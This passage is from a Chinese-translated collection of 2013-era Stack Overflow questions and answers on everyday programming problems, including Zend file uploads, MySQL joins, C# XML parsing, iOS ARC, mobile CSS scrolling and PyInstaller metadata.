    <-this is line number 20->$this->id       = (isset($data['id'])) ? $data['id'] : null;
    $this->title  = (isset($data['title'])) ? $data['title'] : null;
    $this->company  = (isset($data['company'])) ? $data['company'] : null;
    $this->sector  = (isset($data['sector'])) ? $data['sector'] : null;
    $this->report_date  = (isset($data['report_date'])) ? $data['report_date'] : null;
    $this->report_file = (isset($data['report_file'])) ? $data['report_file'] : null;

} 
```

下面是editAction代码

```
public function editAction(){
    $id = (int) $this->params()->fromRoute('id', 0);
    if (!$id) {
        return $this->redirect()->toRoute('companyreport', array(
            'action' => 'add'
        ));
    }

    // Get the Album with the specified id.  An exception is thrown
    // if it cannot be found, in which case go to the index page.
    try {
        $companyreport = $this->getCompanyReportTable()->getCompanyReport($id);
    }
    catch (\Exception $ex) {
        return $this->redirect()->toRoute('companyreport', array(
            'action' => 'index'
        ));
    }

    $form  = new CompanyReportForm();
    $form->bind($companyreport);
    $form->get('submit')->setAttribute('value', 'Edit');

    $request = $this->getRequest();
    if ($request->isPost()) {

        $companyreport = new CompanyReport();
        $form->setInputFilter($companyreport->getInputFilter());

        $nonFile = $request->getPost()->toArray();
        $File    = $this->params()->fromFiles('report_file');

        $data    = array_merge_recursive(
                    $this->getRequest()->getPost()->toArray(),          
                   $this->getRequest()->getFiles()->toArray()
               );
         $form->setData($data);

        if ($form->isValid()) {

            $size = new Size(array('min'=>500000)); //minimum bytes filesize

            $adapter = new \Zend\File\Transfer\Adapter\Http();
            //validator can be more than one...
            $adapter->setValidators(array($size), $File['name']);

            if (!$adapter->isValid()){
                $dataError = $adapter->getMessages();
                $error = array();
                foreach($dataError as $key=>$row)
                {
                    $error[] = $row;
                } //set formElementErrors
                $form->setMessages(array('report_file'=>$error ));
            } else {

                $adapter->setDestination(dirname(__DIR__).'/company_reports');
                if ($adapter->receive($File['name'])) {
                    $companyreport->exchangeArray($form->getData());
                    $this->getCompanyReportTable()->saveCompanyReport($companyreport);

                // Redirect to list of albums
                return $this->redirect()->toRoute('companyreport');
                }
            } 
        } 
    }

    return array(
        'id' => $id,
        'form' => $form,
    );
} 
```

**请建议使用 editAction 进行文件上传。**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T18:52:02.870

我认为这不是文件上传代码的问题。您已将实体绑定到表单：

```
$form->bind($companyreport); 
```

执行时`$form->setData($data)`，表单将发布的数据与实体绑定。这意味着`$form->getData()`将返回填充了所有数据的实体。这就是错误所说的，它返回一个实体（`CompanyReport`），而不是一个数组。

`$form->getData()`为( )执行的代码`Zend\Form\Form\getData()`是：

```
 //IF YOU BIND, $this->object WILL BE THE ENTITY, SO IT'LL RETURN IT    
    if (($flag !== FormInterface::VALUES_AS_ARRAY) && is_object($this->object)) {
        return $this->object;
    }

    //OTHERWISE IT'LL RETURN AN ARRAY WITH POSTED DATA
    $filter = $this->getInputFilter();

    if ($flag === FormInterface::VALUES_RAW) {
        return $filter->getRawValues();
    }

    return $filter->getValues(); 
```

如果你想使用你的`exchangeArray`函数，你可以将合并的数组传递给它`$data`。但这是不必要的，当您将表单绑定到实体时，“exchangeArray 作业”由表单本身完成。

# symfony - 带注释的实体验证不适用于 FormFactory 类

> ID：15879685
> 
> 赞同：0
> 
> 时间：2013-04-08T12:58:04.410
> 
> 标签：symfony

我创建了一个包含两个实体的表单，使用 AcmePizzaBundle 的代码作为示例。

我有`MyBundle/Entity/Factory/UploadFactory.php`哪个是表单的工厂类。除了两个实体（用户和视频）之外，还有第三个 UploadType.php 表单类：

```
// MyBundle/Form/Type/UploadType.php
public function buildForm(FormBuilderInterface $builder, array $options)
{
    $builder->add('user', new UserType())
            ->add('video', new VideoType());
} 
```

`UserType()`并且`VideoType()`是表单类型类，并从它们各自的实体中保存必要的字段。

以上是从控制器/方法调用的：

```
public function indexAction(){
  // create upload
  $factory = new UploadFactory();

  $form = $this->createForm(new UploadType(), $factory);
} 
```

User 和 Video 实体具有带注释的验证。这在合并这两个表单之前运行良好，但现在没有服务器端验证。

我假设验证没有通过，有没有办法强制这样做？

该代码受到披萨包代码[https://github.com/beberlei/AcmePizzaBundle/blob/master/Entity/Factory/OrderFactory.php的“启发”](https://github.com/beberlei/AcmePizzaBundle/blob/master/Entity/Factory/OrderFactory.php)

谢谢。

编辑：

```
$factory = new UploadFactory();
var_dump($factory);

// gives...
object(Project\MyBundle\Entity\Factory\UploadFactory)#101 (3) {
  ["user":"Project\MyBundle\Entity\Factory\UploadFactory":private]=> NULL
  ["video":"Project\MyBundle\Entity\Factory\UploadFactory":private]=> NULL 
} 
```

# tfs - TFS 主管签到

> ID：15879688
> 
> 赞同：1
> 
> 时间：2013-04-08T12:58:07.970
> 
> 标签：tfs

是否可以在 TFS 中进行“预签入”？

我的场景是我希望代码审计员在提交源代码控制之前进行代码审计。这确保了我公司内部实践中的代码质量和架构检查合规性。

就像程序员签入他/她的代码一样，通知会自动发送给代码审计员，审计员会检查合规性并将其提交给源代码控制。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T14:11:09.687

在 TFS 中有一个`Shelveset`. 这是一个尚未提交到源代码控制的签入（有点像软签入）。您团队的其他成员也可以访问您的`Shelveset`。

在`TFS 2012`中，他们引入了一个基于该系统的代码审查`Shelveset`系统。

更多信息：http: [//channel9.msdn.com/Series/Visual-Studio-2012-Premium-and-Ultimate-Overview/Visual-Studio-Ultimate-2012-Using-Code-Review-to-Improve-Quality](http://channel9.msdn.com/Series/Visual-Studio-2012-Premium-and-Ultimate-Overview/Visual-Studio-Ultimate-2012-Using-Code-Review-to-Improve-Quality)

货架有很多用途（取自[这里](https://stackoverflow.com/questions/556981/what-is-shelving-in-tfs-just-a-soft-checkin-so-others-can-see-code)@TJB）

1.  **上下文切换**：将您的工作保存在当前任务上，以便您可以切换到另一个高优先级任务。假设您正在开发一项新功能，并专注于自己的业务，这时您的老板跑进来说“啊！Bug Bug Bug！” 并且您必须放弃对该功能的当前更改，然后修复该错误。您可以搁置您在功能上的工作，修复错误，然后回来并取消搁置以处理您的更改。
2.  **共享变更集：**如果您想在不签入的情况下共享代码变更集，您可以通过搁置它来方便其他人访问。当您将不完整的任务传递给其他人（可怜的灵魂）时，或者如果您有某种测试代码，您永远不会签入其他人需要运行的代码，这可以使用。h/t 对其他关于使用它进行评论的回复，这是一个非常好的主意。
3.  **保存你的进度：**当你在处理一个复杂的功能时，你可能会发现自己正处于一个想要保存你的进度的“好点”，这是搁置你的代码的理想时机。假设你正在修改一些 CSS / HTML 来修复渲染错误，通常你会在它上面迭代你能想到的每一个可能的 kludge，直到它看起来正确。但是，一旦它看起来正确，您可能想尝试返回以清理您的标记，以便其他人在您签入之前能够理解您所做的事情。在这种情况下，您可以在一切都呈现正确时搁置代码，那么您就可以自由地重构您的标记，如果您不小心再次破坏它，您可以随时返回并获取您的变更集。

# clojure - clojure 中的 HTTPS 身份验证

> ID：15879692
> 
> 赞同：1
> 
> 时间：2013-04-08T12:58:17.677
> 
> 标签：clojure

A 有一个从静态 url 解析 xml 的应用程序。直到最近他们更新了对 URL 的访问权限时，应用程序才起作用。现在需要输入 NT 用户名/密码。

我正在努力做到这一点，因为除了提供的库之外，我无法安装任何额外的库，其中之一不是 clj-http。在clojure中还有其他方法吗？例如，我将如何使用 java.org.apachehttpclient？

```
(ns Summary
(:import [java.net URL])
(:use [clojure.java.io :only [input-stream]])
(:require [clojure.xml :as xml])  
(:require [clojure.zip :as zip])  
(:require [clojure.contrib.zip-filter.xml :as zf]))  

(defn get-field [element child]
(zf/xml1-> element child zf/text))

(defn parse-record [rec-xml]
(into {}
    (map 
        #(vector % (get-field rec-xml %))
        [:sys_id :sys_updated ])))

(defn get-records [xml]
(map 
    parse-record
    (zf/xml-> (zip/xml-zip xml)
              :Record                                
              )))
(def viewDoc 
(with-open [is (input-stream      (URL. "https://www.test.com" "Domain/username" "password"))]
    (let [recs (doall (get-records (xml/parse is)))]

)
)) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T17:31:44.200

[这](http://hc.apache.org/httpcomponents-client-ga/ntlm.html)应该让你继续前进。应该很容易转换为 Clojure。

# java - 从 java netbeans 中的某些 JtextField 中删除空格

> ID：15879695
> 
> 赞同：0
> 
> 时间：2013-04-08T12:58:22.693
> 
> 标签：java, swing, netbeans, jtextfield

我想从 JtextField 中删除空格，因此当用户单击按钮时，它会自动从他/她编写的文本中删除空格。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T13:00:27.377

这将用空字符串替换每个空格：

```
String text = txtField.getText().replaceAll("\\s+", "");

// or just
// String text = txtField.getText().replace(" ", ""); 
```

如果您只需要删除尾随和前导空格，请执行以下操作：

```
String text = txtField.getText().trim(); 
```

* * *

最后将您的新文本设置到文本字段中：

```
textField.setText(text); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T13:03:39.693

```
String sessi = textField.getText();
System.out.println(sessi.replaceAll(" ","")); 
```

会为你工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-08T13:09:57.513

简单地说，您需要为用户要单击的按钮添加一个动作侦听器。例如：该按钮将用于发布某些内容。“邮政”

```
public class YourProject extends JFrame implements ActionListener{

JtextField text = new JtextField();
JButton post = new JButton("POST");

public YourProject(){

add(text);
add(post);
post.addactionlistener(this);
setVisible(true);

}

 @Override
public void actionPerformed(ActionEvent e) {

if(e.getSource()==post) {

String removed = text.getText().trim();

System.out.println(removed);

} 
```

如果用户写“Hello World”然后点击发布，输出将是“HelloWorld”。希望这可以帮助。

# mysql - WHERE 子句中的 MySQL INNER JOIN 错误

> ID：15879697
> 
> 赞同：0
> 
> 时间：2013-04-08T12:58:28.583
> 
> 标签：mysql, sql, inner-join

在此示例中，我的查询有问题：

```
 SELECT pm.name,
       pm.pre_id,
       pm.pgs_id,
       pm.link,
       pm.del,
       pm.maz_kaina,
       pm.int_kaina,
       pm.d1_kaina,
       pm.d2_kaina,
       pm.d3_kaina,
       pm.pvm,
       pm.vnt,
       pm.gamintojas,
       pm.akcija,
       pm.akc_kaina
FROM   `prekes_main` AS pm
       INNER JOIN (SELECT charak_pre.pr_id
                   FROM   charak_pre
                   WHERE  charak_pre.cha_id = 206
                          AND charak_pre.reiksme = 'Parfumuotas vanduo'
                          AND charak_pre.pr_id = pm.pre_id) AS reikiamos_pre0
               ON reikiamos_pre0.pr_id = pm.pre_id
WHERE  pm.pgs_id = '2431'
ORDER  BY pm.del DESC,
          int_kaina ASC
LIMIT  0, 18 
```

`INNER JOIN`当我尝试执行此操作时遇到问题。这是我得到的错误：

```
SQL Error (1054): Unknown column 'pm.pr_id' in WHERE clause. 
```

发生错误的位置是：`and charak_pre.pr_id = pm.pr_id`。有了这个，我想通过键 charak_pre.pr_id 和 prekes_main.pre_id 从 charak_pre 表中选择等于 prekes_main 行的行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:01:06.380

实际上，您可以在没有子查询的情况下执行此操作，因为您没有对以下行执行任何聚合。而是直接将其与表连接`charak_pre`并将其他条件放在`WHERE`子句上。

```
SELECT  DISTINCT pm.*
FROM    prekes_main as pm
        INNER JOIN charak_pre
           ON charak_pre.pr_id = pm.pre_id
WHERE   pm.pgs_id = '2431' AND 
        charak_pre.cha_id = 206 AND 
        charak_pre.reiksme = 'Parfumuotas vanduo'
ORDER   BY pm.del DESC, int_kaina ASC 
LIMIT   0, 18 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:05:35.133

我会在没有子查询的情况下编写它，这似乎是一件低效的事情，但我还没有测试过。改为进行普通连接：

```
SELECT  pm.name, 
        pm.pre_id, 
        pm.pgs_id, 
        pm.link, 
        pm.del, 
        pm.maz_kaina, 
        pm.int_kaina, 
        pm.d1_kaina, 
        pm.d2_kaina, 
        pm.d3_kaina, 
        pm.pvm, 
        pm.vnt, 
        pm.gamintojas, 
        pm.akcija, 
        pm.akc_kaina
FROM    `prekes_main` as pm
        INNER JOIN charak_pre charak_pre  as reikiamos_pre0 
            ON reikiamos_pre0.pr_id = pm.pre_id AND charak_pre.cha_id = 206 and 
                    charak_pre.reiksme = 'Parfumuotas vanduo'
WHERE   pm.pgs_id = '2431' 
ORDER   BY pm.del DESC, 
        int_kaina ASC 
LIMIT 0,18 
```

# c# - 解析 xdocument 并绑定到网格

> ID：15879703
> 
> 赞同：0
> 
> 时间：2013-04-08T12:58:47.760
> 
> 标签：c#, linq, parsing, linq-to-xml

我有时间将 xdocument 数据绑定到 gridview。我在这个想法上需要帮助，我尝试了各种方法来做同样的事情，但都是徒劳的.....下面是 xml 字符串。

```
 <sparql xmlns="http://www.w3.org/2005/sparql-results#"> 
    <head>  
    <variable name="EmpId" />    <variable name="EmpName" />    </head>
    <results> 
    <result> <binding name="EmpId">  
    <uri>http://www.brightstardb.com/categories/1</uri>    </binding>
    <binding name="EmpName">  
    <uri>http://www.brightstardb.com/categories/Smith</uri>    </binding> 
    </result> <result> </results> </sparql> 
```

我需要将此绑定到 dotnet c# win 应用程序中的 gridview，下面是我采用但无法成功绑定的一种方法......请帮助。

```
 var result = XDocument.Load(client.ExecuteQuery(storeName, query));
var doc = XDocument.Parse(result.ToString());
IEnumerable<Prescriber> products = from x in doc.Descendants("result")
     select new Prescriber()
      {
               EmpId= x.Element("EmpId").Value,
               EmpName= x.Element("EmpName").Value
       }; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T12:33:09.370

我有一个想法，你想要数据网格中的两列，“EmpId”和“EmpName”。使用给定的 XML，我希望有一行，第一列是 =“ [http://www.brightstardb.com/categories/1](http://www.brightstardb.com/categories/1) ”，第二列是 = “ [http://www.brightstardb.com/categories/Smith](http://www.brightstardb.com/categories/Smith) ”

如果是真的，这里是一个示例代码：

```
 var doc = XDocument.Load("XMLFile1.xml");
    XNamespace ns = "http://www.w3.org/2005/sparql-results#";

    var products = from x in doc.Descendants(ns + "result")
                 select new Prescriber
                 {
                     EmpId = x.Elements(ns + "binding").Single(e => e.Attribute("name").Value == "EmpId").Element(ns + "uri").Value,
                     EmpName = x.Elements(ns + "binding").Single(e => e.Attribute("name").Value == "EmpName").Element(ns + "uri").Value
                 };

    datagridview.DataSource = products.ToList(); 
```

请注意以下事项：

如果任何“结果”XElement 缺少“EmpId”或“EmpName”属性，示例将失败。

Prescriber 类需要真实属性“public string EmpId { get; set; }”简单字段将不起作用。

您必须调用 .ToList() 作为最后一步，由于某种原因 IEnumerable< T > 不起作用。

是的，LinqToXML 查询要复杂一些，如果您有时间，请查找 MSDN。

# .net - 什么是异步读取 HttpWebRequest 响应流的好用例？

> ID：15879704
> 
> 赞同：0
> 
> 时间：2013-04-08T12:58:48.227
> 
> 标签：.net, asynchronous, httpwebrequest

我有这个代码并行使用很多`HttpWebRequest`。它目前同步执行此操作，但我将其更改为异步使用`BeginGetResponse`以提高性能。

现在我可以异步发送查询，但仍然可以同步读取响应流。混合两种模式是完全愚蠢的吗？异步读取流是否也有优势（比如花费更少的时间）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:03:06.113

> 混合两种模式是完全愚蠢的吗？

一点也不。这取决于反应。

> 异步读取流是否也有优势（比如花费更少的时间）？

如果服务器正在流式传输响应并且数据包之间需要相当长的时间，那么异步读取响应流也可能会有所帮助。

如果服务器只是以一个块的形式发送响应，那么您必须决定是否值得为实现异步读取付出额外的努力和复杂性。

* * *

根据经验，异步运行最重要的部分是，如您所说，`BeginGetResponse`. 否则，您总是使用线程等待服务器生成响应。

# c# - 查找系统中位于定义的文件夹层次结构内的所有文件

> ID：15879705
> 
> 赞同：0
> 
> 时间：2013-04-08T12:58:48.587
> 
> 标签：c#, .net, directory

我想在系统中找到名称`TestName.lol`位于`TestRoot\TestSubFoler\Test\`.

即，如果 a`TestRoot\TestSubFoler\Test\TestName.lol`在磁盘**C**和**D**上都有，那么我想获得 2 个文件。

我考虑了不同的方法来做到这一点：

1.  `C:\`从and开始`D:\`，然后递归搜索`TestRoot`. 然后对所有发现的事件执行相同操作，而不是`C:\`and `D:\`。等等。

2.  递归搜索所有文件夹`TestName.lol`。然后过滤掉位于“错误”文件夹中的那些。（我相信在我的情况下这会更快，因为此类文件的估计数量并不大：1-10）

3.  ？？？我相信可以有更好的方法（更优雅或性能更好）。无论如何，如果您认为我的解决方案可以，请确认。

谢谢。

编辑： [使用复杂模式搜索目录中](https://stackoverflow.com/questions/158460/search-file-in-directory-using-complex-pattern)的文件类似的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T13:00:47.527

看一下[Directory.GetFiles](http://msdn.microsoft.com/en-us/library/07wt70x2.aspx)方法。那应该做你想做的事。

实际上，[这个重载](http://msdn.microsoft.com/en-us/library/wz42302f.aspx)可能是您需要的。

或者，您可以调用[Directory.EnumratFiles](http://msdn.microsoft.com/en-us/library/dd383571.aspx)，它会为您执行递归。

您的选项＃2可能是要走的路。

确实没有一种特别有效的方法可以做到这一点。`FindFirst`您可以通过直接调用 Windows和API 函数来加快速度`FindNext`，但除非您经常这样做，否则不值得付出努力。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T13:25:08.863

我个人觉得很难避免递归。因为文件系统没有被索引。Google 桌面或 Microsoft 桌面搜索为所有文件编制了索引。如果您在那里查询，您将很快得到答案。

我们的选择是 .net 框架为您执行递归，或者您自己执行。

其他选项是 Linq - 我猜 .net 框架会进行递归。但它会更干净

**林克**

[http://msdn.microsoft.com/en-us/library/bb882649.aspx](http://msdn.microsoft.com/en-us/library/bb882649.aspx)

```
// Take a snapshot of the file system.
        System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(startFolder);

        // This method assumes that the application has discovery permissions 
        // for all folders under the specified path.
        IEnumerable<System.IO.FileInfo> fileList = dir.GetFiles("*.*", System.IO.SearchOption.AllDirectories);

        string searchTerm = @"Visual Studio";

        // Search the contents of each file. 
        // A regular expression created with the RegEx class 
        // could be used instead of the Contains method. 
        // queryMatchingFiles is an IEnumerable<string>. 
        var queryMatchingFiles =
            from file in fileList
            where file.Extension == ".htm" 
            let fileText = GetFileText(file.FullName)
            where fileText.Contains(searchTerm)
            select file.FullName;

        // Execute the query.
        Console.WriteLine("The term \"{0}\" was found in:", searchTerm);
        foreach (string filename in queryMatchingFiles)
        {
            Console.WriteLine(filename);
        } 
```

**.net 代码**

```
foreach (FileInfo fi in directory.GetFiles())
{
  // Console.WriteLine(@"Found file: [{0}] in directory: [{1}]", fi.Name, directory.FullName);

}
 foreach (DirectoryInfo diSourceSubDir in directory.GetDirectories())
 {
    // Console.WriteLine(@"Sub Folder {0} found.", diSourceSubDir.FullName);
 } 
```

# ios - 需要有关 ARC 概念的帮助

> ID：15879709
> 
> 赞同：0
> 
> 时间：2013-04-08T12:58:52.633
> 
> 标签：ios, objective-c, automatic-ref-counting

在 ARC 环境中，我`MyClass *mcObj = [[MyClass alloc]init]`在使用它之后有一个对象，我应该就这样离开它还是`mcObj = nil;`在使用它之后执行此操作。

该对象可以存在于任何范围内，例如全局范围内`viewcontroller`或仅在方法内，`-(void)aMethod;`请解释这两种情况。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-08T13:01:51.863

答案是——“视情况而定”。

如果您在方法中创建它并且不将其分配给任何东西，那么当它超出范围时，它将被设置为 nil。（实际上，LLVM 会为您插入相关`release`调用）。

如果你在函数外部传递变量，那么局部变量在超出范围时仍然会被设置为 nil，但是如果你的对象有强引用，它就不会被释放。

一般来说，你真的不必考虑太多。如果你想保留一个对象，那么你要保持对它的强引用，否则你不必担心保留释放调用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-08T13:02:54.700

你这样写：

```
MyClass *mcObj = [[MyClass alloc]init]; 
```

所以希望它是函数内部的局部变量。

在这两种情况下，当你写`mcObj = nil;`的对象都会被释放并设置为 nil。

它相当于：

```
[mcObject release];
mcObj = nil; 
```

在非电弧模式下。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T13:01:32.810

就这样吧！

ARC会照顾它！ARC 将在它认为最好的地方释放/保留它。

# iphone - 在 iPhone 网站上禁用水平滚动

> ID：15879710
> 
> 赞同：21
> 
> 时间：2013-04-08T12:59:00.383
> 
> 标签：iphone, ios, css, mobile-safari, horizontal-scrolling

我正在开发一个 Wordpress 驱动的网站的 iPhone 版本，我想知道当网站在 iPhone 的 Safari 中打开时是否有任何方法可以禁用水平滚动。现在，我已经完成了一半的开发，只是为了检查是否可以禁用水平滚动，我隐藏了任何超过屏幕宽度的元素，但我仍然可以水平滚动到右侧。我尝试将以下代码放在`<style>`标签中，`<head>`但这没有帮助：

> 身体 { 溢出-x：隐藏；}

如果用户正在从 iPhone 上查看网站，我已将以下`<meta>`代码放入头文件中以回显，但它只会禁用用户捏合，即您无法通过捏合屏幕来放大和缩小。

```
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
```

我目前正在使用 iPhone 4 来查看网站，可以通过以下链接访问该网站：http: [//ignoremusic.com](http://ignoremusic.com)。期待各位大神解答，谢谢。

> **解决方案：**正如@Riskbreaker 所建议的，有一些元素的宽度超过了~312px，这就是为什么我仍然可以向左滑动，在调整所有这些元素的宽度后，我禁用了水平滑动。我学到的一件事是隐藏 overflow-x 对 iPhone/iPad 没有帮助，你必须将所有元素的宽度减小到屏幕宽度，否则你仍然可以水平滑动。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2016-05-24T01:03:33.760

我知道我参加聚会有点晚了，但是我遇到了同样的问题并通过添加以下内容解决了它：

```
body, html{
    overflow-x: hidden;
} 
```

希望这对其他人有帮助！

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-04-08T13:14:31.893

像这样在你的身体上添加溢出：

```
body    {
        font: 12px/20px "Helvetica neue", Helvetica, Arial, sans-serif;
        font-weight: normal;
        overflow: hidden;
        overflow-y: auto;
        } 
```

是的，请继续这样做：

```
<meta name="viewport" content="width=device-width"> 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2017-06-08T08:48:39.217

对于位于视口区域之外的移动菜单，我遇到了同样的问题。overflow-x：隐藏在安卓手机中解决，但在 iPhone 中没有。我通过将菜单的“绝对”位置更改为“固定”位置来解决：

```
body { overflow-x: hidden; }    
nav { position: absolute; width: 300px; right: -300px; } 
```

到：

```
body { overflow-x: hidden; }    
nav { position: fixed; width: 300px; right: -300px; } 
```

希望能帮助到你。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-05-07T12:20:17.247

对我来说，这也解决了这个问题：

```
html {
    overflow-x: hidden;
    max-width: 100vw;
} 
```

通过最大宽度，屏幕似乎是固定的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2022-02-22T16:10:27.103

我最近遇到了同样的问题，但没有其他答案对我有用。在最新版本的 Safari（至少是桌面版）中，您还必须将位置设置为相对。

```
body, html {
  position: relative;
  overflow: hidden;
} 
```

# python - pyinstaller 2.0 - 如何为 windows exe 文件添加描述？

> ID：15879713
> 
> 赞同：4
> 
> 时间：2013-04-08T12:59:09.430
> 
> 标签：python, pyinstaller

如何将版本、版权、文件描述等描述添加到单个文件 (exe)

![在此处输入图像描述](https://i.stack.imgur.com/jHzwB.png)

```
python pyinstaller.py -F -w -i favicon.ico C:\Projekte\Eclipse\MyApp\app.pyw 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-26T23:27:48.387

> --version-file=versioninfo.txt

示例：PATH_TO\PyInstaller-2.1\tests\basic\test_pkg_structures-version.txt

阅读手册“捕获版本数据”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:37:50.647

我建议你阅读这个线程，[关于 Pyinstaller 的综合教程？](https://stackoverflow.com/questions/5543920/comprehensive-tutorial-on-pyinstaller). 会对你有所帮助。另一方面，我使用了 py2exe，如果你使用 py2exe 是最强大的，我给你留下了一个 py2exe 的 setup.py，在这个 setup.py 上你可以看到你想要获取 app.exe 的属性。

```
from distutils.core import setup
import py2exe, sys 
import glob

setup(
    name='AppName',
    version='1.0',
    scripts=['src\modInicio\inicio_class.py'],
    windows=['src\modInicio\inicio_class.py'],
    data_files=[('glade', glob.glob('interface\Sname.glade')), ('', glob.glob('gui/config.ini'))],
    packages=['src\modules'],
    options={'py2exe':{'packages':'encodings,reportlab',                        
                       'includes':'gtk,gtk.glade,cairo,pango, pangocairo, atk,gobject, logging, sqlalchemy,sqlalchemy.ext.sqlsoup'                       
                     },
            'sdist':{'formats':'zip'}
           }
 ) 
```

我把这个链接留在这里，[http://www.pyinstaller.org/export/develop/project/doc/Manual.html](http://www.pyinstaller.org/export/develop/project/doc/Manual.html)，在它的文档中出现了这样的东西

```
 Windows specific options:
--version-file=FILE
     add a version resource from FILE to the exe
-m FILE, -m XML, --manifest=FILE, --manifest=XML
     add manifest FILE or XML to the exe 
```

# jasper-reports - 如何限制文本字段的高度？

> ID：15879715
> 
> 赞同：1
> 
> 时间：2013-04-08T12:59:16.090
> 
> 标签：jasper-reports

A 有一个*textField*和*subreport*放置在彼此相邻的一个详细信息带中。

代码：

```
<band height="14" splitType="Stretch">
    <textField isStretchWithOverflow="true" isBlankWhenNull="true">
    <reportElement style="cell" stretchType="RelativeToBandHeight" x="149" y="0" width="25" height="14" isPrintWhenDetailOverflows="true"/>
        <textElement textAlignment="Center" verticalAlignment="Middle">
            <font fontName="Arial" size="6" isBold="false"/>
        </textElement>
        <textFieldExpression><![CDATA[$F{RZPR}]]></textFieldExpression>
</textField>
    <subreport>
    <reportElement stretchType="RelativeToTallestObject" x="0" y="0" width="802" height="14"/>
        <dataSourceExpression><![CDATA[$F{CSR_SUB}]]></dataSourceExpression>
        <subreportExpression><![CDATA[$P{SUBREPORT_DIR} + "cashflowplan/sub_all.jasper"]]></subreportExpression>
    </subreport>
</band> 
```

有时这会导致下一种情况：

截屏：

![在此处输入图像描述](https://i.stack.imgur.com/cV3H3.png)

*TextField*占用第一页上的所有可用空间。但是*子报表的*详细*信息带中的**文本字段*移动到下一页，在第一页的末尾留下空白空间。

 **如何解决这个问题？**

# c# - 截取整个 Internet Explorer 文档的屏幕截图

> ID：15879717
> 
> 赞同：1
> 
> 时间：2013-04-08T12:59:17.257
> 
> 标签：c#, internet-explorer

我想用 C# 截取整个 Internet Explorer 文档的屏幕截图。

我已经下载了很多第三方组件，但没有一个提供代码，有人可以帮我解决这个问题吗？

我正在使用带有框架 3.5 的 IE9 和 Visual Studio 10。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:20:36.660

WebBrowser 控件的未记录方法称为：

`DrawToBitmap(Bitmap bitmap, Rectangle targetBounds);`

[https://stackoverflow.com/search?q=WebBrowser+Control+DrawToBitmap](https://stackoverflow.com/search?q=WebBrowser+Control+DrawToBitmap)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T13:24:14.157

网上有一些教程允许您通过各种方法来做到这一点，这个有点难以理解，但使用 DLL 并调用它们来截取活动窗口的屏幕截图。

它还提供了一些源代码和示例项目来帮助您入门:)

[http://www.csharphelp.com/2006/11/capturing-the-screen-image-using-c/](http://www.csharphelp.com/2006/11/capturing-the-screen-image-using-c/)

# php - SQL Server 查询在一些奇怪的 ascii 字符上失败

> ID：15879719
> 
> 赞同：1
> 
> 时间：2013-04-08T12:59:18.433
> 
> 标签：php, sql-server, pdo

我有一个功能可以从我的邮箱中提取电子邮件并将它们保存在我的数据库中。对于 95% 的查询，一切正常，但对于某些查询失败并出现以下错误：

> 警告：PDOStatement::execute(): 消息：字符串 ' 后面的未闭合引号

我能够跟踪导致问题的字符。看起来其中之一是 ASCII 160 和 ASCII 147。当我`str_replace`在电子邮件上运行简单时，我能够正确保存文本而没有错误。为什么会导致问题？

```
 $body = $this->get_part($imap, $b, "TEXT/HTML");
    if($body == "")
    {
        $body = $this->get_part($imap, $b, "TEXT/PLAIN");
    }
    $header = imap_headerinfo($imap, $b);
    $subject = $header->subject;
    $fromaddress = $header->fromaddress;
    /////////////////////////////
    $data = array('content'=>$body);
    $query = $PDO->prepare('insert into [tbl_test] (content) values (:content)');
    $query->execute($data);
    break; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-26T13:09:35.653

保存查询之前的 uth8_encode() 解决了这个问题。

# javascript - 使用 Zurb Foundation Reveal 插件打开页面加载覆盖

> ID：15879721
> 
> 赞同：3
> 
> 时间：2013-04-08T12:59:25.843
> 
> 标签：javascript, modal-dialog, zurb-foundation

这里有关于这个主题的另一个问题，但似乎没有发布完整的解决方案，并且链接到的示例不再有效，因此我发布了这个问题。

我正在寻找一种在页面加载时打开 Zurb Foundation Reveal 模式的方法（更具体地说，我想在页面加载几秒钟后执行此操作）。我不写 javascript，所以我只知道我需要发生的事情，所以我希望你们聪明的 JS 人可以帮助我。

如果我想使用开箱即用的显示，我会：

1) 在页面中包含一个 ID 为“openMyModal”之类的链接，例如：

```
<a href="#" id="openMyModal">This is my modal-opening link</a> 
```

2) 在页脚中包含将侦听该 ID 上的单击事件并打开相应模式的 JS，也由 ID 给出：

```
<script type="text/javascript">
    $(document).ready(function() {
        $("#openMyModal").click(function() {
            $("#myModal").reveal();
        });
    });
</script> 
```

3) 在我的页眉或页脚中包含 jQuery

4) 在标签前的页脚某处插入具有上述 ID 的 div 中的模态内容。

```
<div id="myModal">
    This is my modal window.
</div> 
```

这很好用。但这仅适用于我想在用户交互的基础上打开模式（即他们点击提供的链接）。

